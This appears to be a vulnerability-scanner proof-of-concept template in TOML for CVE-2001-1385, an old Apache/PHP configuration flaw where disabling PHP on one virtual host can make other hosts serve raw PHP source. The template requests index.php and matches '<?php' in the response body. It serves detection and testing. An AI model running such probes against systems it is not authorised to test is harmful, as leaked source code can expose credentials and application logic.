[info]
author = "AVE"
description = "检测 PHP Apache 模块配置隔离缺陷导致的源代码泄露漏洞。当管理员为虚拟主机设置 engine=off 禁用 PHP 引擎时，该配置可能影响同一 Apache 实例上的其他虚拟主机，导致 PHP 脚本源代码被直接返回。"
id = "POC-AVE-2001-0503"
name = "CVE-2001-1385 PoC"
severity = "medium"
tags = ["cve-2001-1385"]
vuln_id = [
    "CVE-2001-1385",
    "AVE-2001-0503",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/index.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<?php"]
